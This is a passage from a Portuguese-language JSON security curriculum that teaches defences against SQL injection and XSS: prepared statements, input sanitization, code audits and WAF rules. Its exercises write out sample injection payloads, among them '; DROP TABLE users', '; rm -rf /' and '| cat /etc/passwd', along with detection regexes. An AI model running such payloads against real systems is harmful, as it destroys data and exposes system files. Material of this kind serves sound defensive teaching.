                                "Extrair hash via Time-based com delays precisos.",
                                "Gerar relatório com payloads e screenshots.",
                                "Identificar 3 mitigações comuns (prepared statements, escaping, WAF)."
                              ],
                              "assessmentCriteria": [
                                "Precisão e correção das payloads (sem falsos positivos).",
                                "Eficiência no número de requests e tempo de extração.",
                                "Compreensão de variações por DBMS (MySQL vs PostgreSQL).",
                                "Documentação clara de steps e erros encontrados.",
                                "Demonstração ética: ênfase em uso defensivo.",
                                "Criatividade em bypasses de filtros simples."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Compreensão profunda de SQL e information_schema.",
                                "Desenvolvimento Web: Análise de PHP/ASP.NET vulneráveis a injeção.",
                                "Redes e Protocolos: Manipulação de HTTP requests/responses.",
                                "Programação: Scripts Python para automação de ataques.",
                                "Ética e Direito: Regulamentações como GDPR em breaches de dados."
                              ],
                              "realWorldApplication": "Durante penetration testing (pentest) autorizado, identificar SQLi em aplicações web corporativas como e-commerces ou portais governamentais, permitindo recomendações de correções como parameterized queries para prevenir vazamentos de dados sensíveis em escala real."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.1.1.3"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.1.3",
                        "name": "Mitigação e Prevenção",
                        "description": "Estratégias e boas práticas para prevenir ataques de injeção, incluindo técnicas de codificação segura.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.1.3.1",
                            "name": "Implementar Prepared Statements",
                            "description": "Utilizar prepared statements e parameterized queries em linguagens como PHP, Java e Python para separar código SQL de dados do usuário.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito de Prepared Statements",
                                  "subSteps": [
                                    "Estude a definição de prepared statements e parameterized queries como mecanismo de separação entre código SQL e dados de entrada.",
                                    "Analise exemplos de SQL Injection em queries concatenadas (ex: ' OR 1=1 --).",
                                    "Compare prepared statements com funções de escaping, destacando limitações do escaping.",
                                    "Revise documentações oficiais para PHP (PDO/mysqli), Python (psycopg2/sqlite3) e Java (PreparedStatement).",
                                    "Identifique cenários comuns de uso em aplicações web."
                                  ],
                                  "verification": "Escreva um parágrafo explicando como prepared statements previnem SQL Injection e forneça um exemplo vulnerável vs. seguro.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação OWASP SQL Injection Prevention",
                                    "Tutoriais oficiais: PHP PDO, Python DB-API, Java JDBC"
                                  ],
                                  "tips": "Use diagramas para visualizar o fluxo de execução de uma query preparada.",
                                  "learningObjective": "Dominar os princípios teóricos de prepared statements e sua importância em segurança web.",
                                  "commonMistakes": [
                                    "Confundir prepared statements com simples escaping de strings.",
                                    "Ignorar que prepared statements são específicos por conexão."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Prepared Statements em PHP",
                                  "subSteps": [
                                    "Configure uma conexão PDO com um banco de dados MySQL ou SQLite.",
                                    "Crie uma query preparada usando placeholders nomeados (:user, :pass) ou posicionais (?).",
                                    "Use $stmt->bindParam() ou $stmt->execute(['user' => $input, 'pass' => $input]) para executar.",
                                    "Integre em um script de login e teste com inputs normais e maliciosos.",
                                    "Registre logs de erros para depuração."
                                  ],
                                  "verification": "Execute o código com input malicioso (' OR 1=1 --) e confirme que retorna apenas resultados válidos, sem dump do banco.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Ambiente XAMPP/WAMP com MySQL",
                                    "Editor de código (VS Code)",
                                    "Banco de teste com tabela users"
                                  ],
                                  "tips": "Sempre feche statements e conexões com try-catch para robustez.",
                                  "learningObjective": "Aplicar prepared statements em PHP de forma prática e segura.",
                                  "commonMistakes": [
                                    "Esquecer de bindar todos os parâmetros.",
                                    "Reutilizar query concatenada por engano."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Prepared Statements em Python",
                                  "subSteps": [
                                    "Instale bibliotecas necessárias (pip install psycopg2 ou use sqlite3 built-in).",
                                    "Estabeleça conexão com cursor parametrizado.",
                                    "Prepare query com %s ou :param e execute com cursor.execute(query, (user, pass)).",
                                    "Implemente em uma função de autenticação e teste com payloads de injeção.",
                                    "Use context managers (with) para gerenciar conexões automaticamente."
                                  ],
                                  "verification": "Rode testes unitários mostrando que inputs como \"'; DROP TABLE users; --\" falham sem afetar o banco.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Python 3.x",
                                    "SQLite ou PostgreSQL local",
                                    "Biblioteca psycopg2-binary"
                                  ],
                                  "tips": "Prefira named parameters para clareza em queries complexas.",
                                  "learningObjective": "Executar prepared statements em Python com padrões de boas práticas.",
                                  "commonMistakes": [
                                    "Usar string formatting (%) em vez de parâmetros.",
                                    "Não commitar transações após execute()."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Prepared Statements em Java e Realizar Testes",
                                  "subSteps": [
                                    "Configure JDBC driver e conexão com DataSource ou DriverManager.",
                                    "Crie PreparedStatement com ? placeholders: pstmt = conn.prepareStatement(query).",
                                    "Sete parâmetros com pstmt.setString(1, user) e executeQuery() ou executeUpdate().",
                                    "Desenvolva um app de login simples e teste contra SQL Injection.",
                                    "Adicione validação de entrada e logging para monitoramento."
                                  ],
                                  "verification": "Compile e execute; verifique que query maliciosa é tratada como literal string sem execução extra.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "JDK 11+",
                                    "IDE (IntelliJ/Eclipse)",
                                    "JDBC driver (mysql-connector-java)"
                                  ],
                                  "tips": "Use try-with-resources para auto-close de statements.",
                                  "learningObjective": "Masterizar prepared statements em Java e validar implementações cross-language.",
                                  "commonMistakes": [
                                    "Chamar setString após execute().",
                                    "Ignorar SQLException em handlers."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Depurar e Aplicar Melhores Práticas",
                                  "subSteps": [
                                    "Crie payloads de SQL Injection (tautologies, UNION, etc.) e teste em todos os códigos.",
                                    "Use ferramentas como SQLMap para scan automatizado.",
                                    "Implemente OWASP ZAP ou Burp Suite para testes dinâmicos.",
                                    "Refatore códigos para stored procedures onde aplicável.",
                                    "Documente o código com comentários sobre segurança."
                                  ],
                                  "verification": "Gere relatório comprovando zero vulnerabilidades SQLi em scans automatizados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "SQLMap",
                                    "OWASP ZAP",
                                    "Scripts de teste unitário (PHPUnit, pytest, JUnit)"
                                  ],
                                  "tips": "Combine prepared statements com input validation e WAF para defesa em profundidade.",
                                  "learningObjective": "Validar e otimizar implementações para produção.",
                                  "commonMistakes": [
                                    "Testar só com payloads simples.",
                                    "Esquecer de limpar banco após testes destrutivos."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um formulário de login web: usuário insere 'admin' OR '1'='1' --; código vulnerável loga como admin, mas com prepared statements, falha autenticação corretamente, protegendo o sistema contra roubo de sessões.",
                              "finalVerifications": [
                                "Implementar login seguro em PHP, Python e Java sem SQLi detectável.",
                                "Explicar mecanismo de binding de parâmetros em entrevista simulada.",
                                "Gerar relatório de testes com SQLMap mostrando 0 vulnerabilidades.",
                                "Refatorar código legado vulnerável para prepared statements.",
                                "Comparar performance de queries preparadas vs. ad-hoc em benchmark simples.",
                                "Documentar código com avisos de segurança."
                              ],
                              "assessmentCriteria": [
                                "Uso correto de placeholders e binding em todas as linguagens (sem concatenação).",
                                "Tratamento de erros e fechamento de recursos (try-catch/with).",
                                "Resistência comprovada a 5+ payloads SQLi variados.",
                                "Clareza e legibilidade do código com comentários.",
                                "Integração com validação de input e logging.",
                                "Eficiência: queries executam em <100ms com dados reais."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Otimização de queries e índices.",
                                "Programação: Padrões ORM (ex: SQLAlchemy, Hibernate).",
                                "Ética e Direito: Conformidade com LGPD/GDPR em proteção de dados.",
                                "Desenvolvimento Ágil: Testes automatizados de segurança (CI/CD).",
                                "Matemática: Lógica booleana em condições de queries."
                              ],
                              "realWorldApplication": "Em e-commerces como Amazon ou bancos online, prepared statements previnem breaches milionários, como o Equifax (2017), protegendo milhões de credenciais contra hackers automatizados."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.1.2.1"
                            ]
                          },
                          {
                            "id": "10.1.4.1.3.2",
                            "name": "Aplicar sanitização e validação de inputs",
                            "description": "Desenvolver funções de escape e validação de entrada específicas para contextos como HTML, SQL e comandos do shell.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Sanitização e Validação",
                                  "subSteps": [
                                    "Definir validação de inputs: verificar se o dado atende a critérios esperados (ex: email válido).",
                                    "Definir sanitização: transformar dados perigosos em seguros (ex: escape de caracteres especiais).",
                                    "Identificar contextos: HTML (XSS), SQL (injeção), Shell (command injection).",
                                    "Estudar exemplos de ataques: XSS com <script>, SQL com ' OR 1=1 --, Shell com ; rm -rf /.",
                                    "Analisar OWASP Top 10 para injeções."
                                  ],
                                  "verification": "Explicar oralmente ou por escrito a diferença entre validação e sanitização com exemplos para cada contexto.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação OWASP Injection Prevention Cheat Sheet",
                                    "Vídeos tutoriais sobre OWASP Top 10"
                                  ],
                                  "tips": "Sempre valide no cliente e sanitize no servidor para dupla proteção.",
                                  "learningObjective": "Dominar definições e contextos de uso para aplicar corretamente.",
                                  "commonMistakes": "Confundir validação (rejeita inválido) com sanitização (torna seguro)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Sanitização para HTML (Escape HTML)",
                                  "subSteps": [
                                    "Estudar entidades HTML: &lt; para <, &gt; para >, &amp; para &. ",
                                    "Criar função escapeHTML() em Python/PHP/JS que itera string e substitui caracteres especiais.",
                                    "Testar com payloads XSS: <script>alert('XSS')</script>.",
                                    "Integrar em um formulário web simples.",
                                    "Verificar com ferramentas como OWASP ZAP."
                                  ],
                                  "verification": "Aplicar função em input malicioso e inspecionar HTML gerado sem scripts executáveis.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Bibliotecas: html.escape() em Python, htmlspecialchars() em PHP",
                                    "Editor de código (VS Code)"
                                  ],
                                  "tips": "Use bibliotecas nativas em vez de regex para evitar falhas.",
                                  "learningObjective": "Desenvolver e testar função de escape HTML eficaz contra XSS.",
                                  "commonMistakes": "Esquecer de escapar & ou usar regex incompleta."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Validação e Sanitização para SQL",
                                  "subSteps": [
                                    "Priorizar prepared statements/parameterized queries sobre escaping manual.",
                                    "Configurar em Python (sqlite3/psycopg2), PHP (PDO) ou JS (mysql2).",
                                    "Criar query parametrizada: SELECT * FROM users WHERE id = ?",
                                    "Testar com payloads: 1' OR '1'='1.",
                                    "Implementar validação adicional: tipo de dado, comprimento."
                                  ],
                                  "verification": "Executar query com input malicioso e confirmar que retorna apenas resultados válidos sem dump de DB.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Banco de dados local (SQLite/MySQL)",
                                    "Documentação PDO ou psycopg2"
                                  ],
                                  "tips": "Nunca concatene strings em queries; sempre use placeholders.",
                                  "learningObjective": "Construir queries seguras resistentes a SQL Injection.",
                                  "commonMistakes": "Concatenar inputs diretamente na query SQL."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Sanitização para Comandos Shell",
                                  "subSteps": [
                                    "Estudar escaping shell: usar quotes, escapes específicos por linguagem.",
                                    "Criar função safeShellExec() que valida input contra caracteres perigosos (; | &).",
                                    "Exemplos: Python subprocess com shell=False, PHP escapeshellarg().",
                                    "Testar com payloads: ; rm -rf / ou | cat /etc/passwd.",
                                    "Implementar lista branca de comandos permitidos."
                                  ],
                                  "verification": "Executar comando com input malicioso e confirmar que ignora ou falha sem executar extras.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ambiente Linux/Windows com shell",
                                    "Bibliotecas: subprocess (Python), escapeshellcmd (PHP)"
                                  ],
                                  "tips": "Evite shell=True; prefira listas de argumentos.",
                                  "learningObjective": "Desenvolver execução segura de comandos resistentes a injections.",
                                  "commonMistakes": "Permitir inputs não sanitizados em system() ou exec()."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Desenvolver Funções Integradas e Realizar Testes Completos",
                                  "subSteps": [
                                    "Criar módulo unificado com funções para HTML, SQL e Shell.",
                                    "Integrar em app de exemplo: formulário que armazena em DB e exibe HTML, executa shell.",
                                    "Criar suíte de testes unitários com payloads conhecidos.",
                                    "Auditar código com linters de segurança (Bandit, PHPStan).",
                                    "Documentar funções com exemplos de uso."
                                  ],
                                  "verification": "Rodar app com 10+ payloads variados e confirmar zero vulnerabilidades exploráveis.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "Framework de testes (pytest, PHPUnit)",
                                    "Ferramentas: sqlmap, XSSer"
                                  ],
                                  "tips": "Automatize testes para CI/CD futura.",
                                  "learningObjective": "Integrar e validar funções em contexto real.",
                                  "commonMistakes": "Testar apenas payloads simples, ignorando variações."
                                }
                              ],
                              "practicalExample": "Desenvolva um script PHP para um blog: usuário submete comentário (input). Valide formato, sanitize para HTML (exibe sem XSS), insira em MySQL com prepared statement (sem SQLi), e execute shell para log (sem command injection). Teste com payloads como <script>alert(1)</script> OR 1=1; ls -la.",
                              "finalVerifications": [
                                "Função escapeHTML converte <script> em entidades seguras.",
                                "Query SQL com input ' OR 1=1 retorna erro ou zero resultados inválidos.",
                                "Comando shell com ; rm ignora e executa apenas comando pretendido.",
                                "App resiste a sqlmap e scanners XSS básicos.",
                                "Logs de auditoria mostram inputs sanitizados.",
                                "Nenhum erro de segurança em OWASP ZAP scan."
                              ],
                              "assessmentCriteria": [
                                "Efetividade: 100% de payloads testados bloqueados.",
                                "Eficiência: Funções executam em <10ms para inputs médios.",
                                "Cobertura: Suporte completo a HTML, SQL e Shell.",
                                "Manutenibilidade: Código limpo com docs e testes.",
                                "Segurança: Sem uso de métodos depreciados ou inseguros.",
                                "Conformidade OWASP: Alinhado com cheat sheets de prevenção."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Integração com HTML/CSS/JS.",
                                "Banco de Dados: Queries avançadas e modelagem.",
                                "Sistemas Operacionais: Comandos shell e processos.",
                                "Ética e Direito: Conformidade com LGPD/GDPR em dados sensíveis."
                              ],
                              "realWorldApplication": "Em desenvolvimento de APIs web seguras para e-commerces ou bancos, prevenindo vazamentos de dados via injeções que custam milhões em breaches (ex: Equifax SQLi afetou 147M usuários)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.4.1.3.3",
                            "name": "Auditar código para injeções",
                            "description": "Realizar revisões de código e usar ferramentas de análise estática para detectar e corrigir vulnerabilidades de injeção.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de auditoria",
                                  "subSteps": [
                                    "Reunir o código-fonte alvo e documentação do projeto.",
                                    "Instalar ferramentas de análise estática como SonarQube, ESLint ou Bandit.",
                                    "Configurar ambiente de desenvolvimento isolado (ex: VM ou container Docker).",
                                    "Estudar o contexto da aplicação (linguagem, framework, pontos de entrada de dados).",
                                    "Definir escopo da auditoria (arquivos específicos ou todo repositório)."
                                  ],
                                  "verification": "Ambiente configurado e código clonado/executável sem erros iniciais.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "IDE como VS Code",
                                    "Ferramentas: SonarQube, OWASP ZAP",
                                    "Repositório Git do código alvo"
                                  ],
                                  "tips": "Use um ambiente sandbox para evitar impactos no sistema principal.",
                                  "learningObjective": "Configurar ferramentas e ambiente para auditoria segura e eficiente.",
                                  "commonMistakes": [
                                    "Ignorar dependências do projeto",
                                    "Auditar sem isolamento de ambiente",
                                    "Não revisar escopo inicial"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Realizar revisão manual do código",
                                  "subSteps": [
                                    "Identificar pontos de entrada de dados do usuário (inputs, queries, APIs).",
                                    "Procurar por concatenações de strings em consultas SQL, comandos OS ou XML.",
                                    "Verificar sanitização de inputs (ex: prepared statements, escaping).",
                                    "Analisar fluxos de dados dinâmicos e validações ausentes.",
                                    "Mapear funções suscetíveis como eval(), innerHTML ou mysqli_query()."
                                  ],
                                  "verification": "Lista de potenciais vulnerabilidades manuais documentada com linhas de código.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Editor de código com syntax highlight",
                                    "Guia OWASP Top 10 Injeções"
                                  ],
                                  "tips": "Procure padrões como 'user_input + query' e anote com comentários.",
                                  "learningObjective": "Detectar manualmente padrões de injeção por inspeção estática.",
                                  "commonMistakes": [
                                    "Focar só em SQL, ignorar NoSQL/Command/XSS",
                                    "Pular validações de input",
                                    "Não mapear fluxos completos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar análise estática com ferramentas",
                                  "subSteps": [
                                    "Configurar regras específicas para injeções na ferramenta (ex: Sonar rules S3649).",
                                    "Executar scan completo no código (ex: sonar-scanner ou eslint --plugin security).",
                                    "Gerar relatório de vulnerabilidades com severidade e localização.",
                                    "Integrar com CI/CD se aplicável para automação.",
                                    "Revisar falsos positivos iniciais."
                                  ],
                                  "verification": "Relatório gerado com lista de issues de injeção classificados.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "SonarQube Community",
                                    "Semgrep ou CodeQL",
                                    "Relatórios em PDF/HTML"
                                  ],
                                  "tips": "Use regras OWASP pré-configuradas para precisão.",
                                  "learningObjective": "Aplicar ferramentas automatizadas para detecção escalável de injeções.",
                                  "commonMistakes": [
                                    "Não customizar regras para o framework usado",
                                    "Ignorar falsos positivos",
                                    "Executar scan sem configuração"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar e priorizar vulnerabilidades",
                                  "subSteps": [
                                    "Classificar achados por severidade (CVSS) e impacto (ex: alta para SQL admin).",
                                    "Correlacionar resultados manuais e automáticos.",
                                    "Reproduzir vulnerabilidades em ambiente de teste.",
                                    "Priorizar por explorabilidade e exposição.",
                                    "Documentar proof-of-concept para cada issue."
                                  ],
                                  "verification": "Relatório priorizado com PoCs e scores de risco.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramenta de teste como Burp Suite",
                                    "Planilha de priorização"
                                  ],
                                  "tips": "Use matriz de risco (probabilidade x impacto) para priorizar.",
                                  "learningObjective": "Interpretar resultados e priorizar riscos reais de injeção.",
                                  "commonMistakes": [
                                    "Tratar todos issues iguais",
                                    "Não reproduzir PoCs",
                                    "Subestimar impactos em cadeia"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Corrigir, retestar e documentar",
                                  "subSteps": [
                                    "Implementar correções (prepared statements, input validation, WAF).",
                                    "Reexecutar scans manuais e ferramentas para verificação.",
                                    "Testar com payloads de injeção (SQLMap para automação).",
                                    "Atualizar documentação de segurança do código.",
                                    "Recomendar práticas preventivas para o time."
                                  ],
                                  "verification": "Zero vulnerabilidades de injeção nos re-scans e testes.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "SQLMap ou payloads OWASP",
                                    "Template de relatório de auditoria"
                                  ],
                                  "tips": "Sempre use parameterized queries em vez de escaping manual.",
                                  "learningObjective": "Corrigir efetivamente e validar mitigação de injeções.",
                                  "commonMistakes": [
                                    "Correções superficiais sem reteste",
                                    "Não documentar lições aprendidas",
                                    "Ignorar testes dinâmicos"
                                  ]
                                }
                              ],
                              "practicalExample": "Audite este código PHP vulnerável: $query = \"SELECT * FROM users WHERE id = \" . $_GET['id'];. Identifique SQL injection, corrija para prepared statement com PDO e reteste com SQLMap confirmando ausência de exploração.",
                              "finalVerifications": [
                                "Nenhuma vulnerabilidade de injeção detectada em scans manuais e estáticos.",
                                "Todas correções validadas com testes de penetração simulados.",
                                "Relatório completo com PoCs, correções e recomendações gerado.",
                                "Código atualizado commitado com mensagens claras de segurança.",
                                "Ambiente de produção pronto para deploy sem riscos conhecidos.",
                                "Time treinado nas vulnerabilidades encontradas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção: 90%+ das injeções reais identificadas.",
                                "Qualidade das correções: Mitigações OWASP-compliant sem introduzir novos bugs.",
                                "Eficiência temporal: Conclusão dentro do tempo estimado.",
                                "Documentação: Relatório claro, com evidências e priorização.",
                                "Uso de ferramentas: Integração correta e interpretação de resultados.",
                                "Criatividade em PoCs: Demonstração real de exploração."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Integração com desenvolvimento full-stack.",
                                "Análise de Dados: Sanitização em queries de banco.",
                                "Ética e Governança: Compliance com LGPD/GDPR em auditorias.",
                                "Gestão de Projetos: Priorização de riscos em sprints.",
                                "Inteligência Artificial: Uso de ML em detecção estática avançada."
                              ],
                              "realWorldApplication": "Em bancos e e-commerces, auditorias regulares previnem breaches como o Equifax (2017), onde injeções SQL expuseram 147 milhões de dados, economizando milhões em multas e recuperação."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.1.2.2"
                            ]
                          },
                          {
                            "id": "10.1.4.1.3.4",
                            "name": "Configurar WAF para proteção",
                            "description": "Implementar Web Application Firewalls (WAF) com regras específicas para bloquear padrões de ataques de injeção.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Selecionar e Configurar Solução WAF",
                                  "subSteps": [
                                    "Pesquisar WAFs compatíveis (ex: AWS WAF, Cloudflare WAF, ModSecurity)",
                                    "Avaliar requisitos do ambiente (cloud, on-premise, integração com load balancer)",
                                    "Provisionar ou instalar o WAF no ambiente de teste",
                                    "Configurar associação com a aplicação web (ex: via ALB ou NGINX)",
                                    "Acessar dashboard administrativo e habilitar logging básico"
                                  ],
                                  "verification": "WAF está ativo, logs são gerados e integração com app web confirmada via health check.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Conta em provedor WAF (AWS/Cloudflare)",
                                    "Documentação oficial do WAF",
                                    "Ambiente de staging com app web vulnerável"
                                  ],
                                  "tips": "Use modo de detecção inicial para evitar bloqueios prematuros.",
                                  "learningObjective": "Identificar e configurar WAF adequado ao stack tecnológico.",
                                  "commonMistakes": [
                                    "Selecionar WAF sem suporte ao tráfego HTTPS",
                                    "Ignorar limites de taxa/custo em soluções cloud"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Padrões de Ataques de Injeção",
                                  "subSteps": [
                                    "Revisar OWASP Top 10 focando em SQLi, XSS e Command Injection",
                                    "Compilar lista de 20 payloads comuns (ex: ' OR 1=1--, <script>alert(1)</script>)",
                                    "Analisar tráfego histórico ou simular requests suspeitos",
                                    "Mapear pontos de entrada vulneráveis na app (query params, POST body, headers)",
                                    "Documentar regex padrões para matching (ex: /union.*select/i)"
                                  ],
                                  "verification": "Documento com lista categorizada de payloads e pontos de entrada criado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "OWASP Cheat Sheet Injection",
                                    "Ferramentas como Burp Suite ou sqlmap",
                                    "Logs de acesso da app web"
                                  ],
                                  "tips": "Priorize payloads reais observados em honeypots ou relatórios de segurança.",
                                  "learningObjective": "Reconhecer assinaturas de ataques de injeção para rule crafting.",
                                  "commonMistakes": [
                                    "Focar só em SQLi ignorando XSS",
                                    "Usar payloads obsoletos que evasões modernas ignoram"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar e Implementar Regras de Bloqueio",
                                  "subSteps": [
                                    "Criar regra managed para injeções OWASP (ex: AWS SQLi rule group)",
                                    "Adicionar regras customizadas com regex para payloads específicos",
                                    "Configurar ações: block com response 403 e log detalhado",
                                    "Definir exceções para falsos positivos (whitelist IPs dev)",
                                    "Ativar regras em modo challenge/block após testes"
                                  ],
                                  "verification": "Regras salvas e ativas no dashboard, sem erros de sintaxe.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Editor de regras WAF",
                                    "Lista de payloads do step 2",
                                    "Documentação de sintaxe regex do WAF"
                                  ],
                                  "tips": "Teste regex em ferramentas online antes de aplicar.",
                                  "learningObjective": "Desenvolver regras precisas para mitigar injeções sem quebrar funcionalidades.",
                                  "commonMistakes": [
                                    "Regras muito amplas causando falsos positivos",
                                    "Falta de escape em regex levando a bypass"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Monitoramento e Alertas",
                                  "subSteps": [
                                    "Habilitar logs detalhados (request/response headers, body)",
                                    "Integrar com SIEM (ex: Splunk, ELK) ou CloudWatch",
                                    "Criar alertas para >10 bloqueios/hora por IP ou payload",
                                    "Definir métricas: taxa de bloqueio, falsos positivos",
                                    "Agendar revisão semanal de logs"
                                  ],
                                  "verification": "Logs fluindo para storage e alerta de teste disparado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Conta SIEM/Cloud Monitoring",
                                    "Templates de dashboard WAF",
                                    "Scripts de parsing de logs"
                                  ],
                                  "tips": "Use filtros para isolar eventos de injeção nos logs.",
                                  "learningObjective": "Estabelecer visibilidade contínua para tuning de regras.",
                                  "commonMistakes": [
                                    "Logs desabilitados economizando custo mas perdendo visibilidade",
                                    "Alertas genéricos sem thresholds"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Validar Configuração",
                                  "subSteps": [
                                    "Executar scans com ferramentas automatizadas (sqlmap, XSStrike)",
                                    "Simular tráfego legítimo para checar falsos positivos",
                                    "Verificar bypass attempts com variações de payloads (case, encoding)",
                                    "Analisar logs pós-teste e ajustar regras",
                                    "Documentar taxa de detecção (>95%) e promover para produção"
                                  ],
                                  "verification": "100% dos payloads de teste bloqueados, zero falsos positivos em tráfego normal.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramentas: sqlmap, Burp Suite, OWASP ZAP",
                                    "Scripts de teste automatizados",
                                    "Ambiente staging idêntico à prod"
                                  ],
                                  "tips": "Registre todos testes em relatório com evidências de screenshots/logs.",
                                  "learningObjective": "Validar eficácia da proteção WAF contra injeções reais.",
                                  "commonMistakes": [
                                    "Testar só payloads simples sem evasões",
                                    "Pular validação em produção simulada"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma aplicação e-commerce hospedada no AWS, configure o AWS WAF em uma ALB: Ative o rule group AWSManagedRulesSQLiRuleSet, adicione custom rule com regex '(?i)(union\\s+select|drop\\s+table)' no body/query string, ação BLOCK. Teste com curl 'http://app.example.com/search?q=\\' OR 1=1--' e confirme 403 com log 'SQLi pattern matched'.",
                              "finalVerifications": [
                                "WAF bloqueia todos payloads OWASP Top 10 de injeção em testes automatizados",
                                "Logs capturam detalhes completos de requests bloqueados sem vazamentos",
                                "Nenhum falso positivo em 100 requests legítimos simulados",
                                "Alertas configurados disparam corretamente em simulação de ataque",
                                "Regras resistem a evasões básicas (encoding, case variation)",
                                "Configuração documentada e replicável"
                              ],
                              "assessmentCriteria": [
                                "Regras cobrem SQLi, XSS e Command Injection com precisão >95%",
                                "Integração seamless sem impacto >5% em latência da app",
                                "Monitoramento ativo com retention de logs >30 dias",
                                "Testes abrangentes documentados com evidências",
                                "Ausência de vulnerabilidades críticas em scan pós-config",
                                "Conformidade com OWASP e CIS benchmarks para WAF"
                              ],
                              "crossCurricularConnections": [
                                "Programação: Sanitização de inputs e prepared statements",
                                "Redes: Análise de pacotes e detecção de anomalias em tráfego",
                                "Gestão de Projetos: Ciclo de vida de segurança (test-plan-deploy-monitor)",
                                "Compliance e Ética: PCI-DSS, GDPR requirements para proteção de dados",
                                "Análise de Dados: Parsing e visualização de logs de segurança"
                              ],
                              "realWorldApplication": "Em bancos ou e-commerces, WAF configurado bloqueia tentativas de SQL injection que visam roubar cartões de crédito, prevenindo breaches como o Equifax, mantendo conformidade regulatória e evitando multas milionárias."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.1.2.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.2",
                    "name": "Cross-Site Scripting (XSS)",
                    "description": "Injeção de scripts maliciosos em páginas web para execução no navegador de usuários.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.2.1",
                        "name": "Definição e Funcionamento do XSS",
                        "description": "Compreender o conceito fundamental de Cross-Site Scripting (XSS), que consiste na injeção de scripts maliciosos em páginas web para execução no navegador de usuários legítimos, explorando falhas na validação de entradas.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.2.1.1",
                            "name": "Identificar vulnerabilidades básicas de XSS",
                            "description": "Reconhecer cenários comuns onde entradas de usuários não são sanitizadas adequadamente, permitindo a injeção de scripts em respostas HTTP.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Básicos de XSS",
                                  "subSteps": [
                                    "Estude a definição de Cross-Site Scripting (XSS): uma vulnerabilidade que permite a injeção de scripts maliciosos em páginas web via entradas não sanitizadas.",
                                    "Aprenda o fluxo básico: usuário envia input malicioso → servidor reflete input em resposta HTTP sem sanitização → navegador executa o script.",
                                    "Identifique os tipos principais: Reflected (via URL/GET), Stored (persistido no banco) e DOM-based (manipulação client-side).",
                                    "Analise diagramas de ataque XSS para visualizar o impacto em sessões de usuário.",
                                    "Diferencie XSS de outras injeções como SQLi."
                                  ],
                                  "verification": "Explique em 3 frases o que é XSS e dê um exemplo de fluxo de ataque.",
                                  "estimatedTime": "20 minutos",
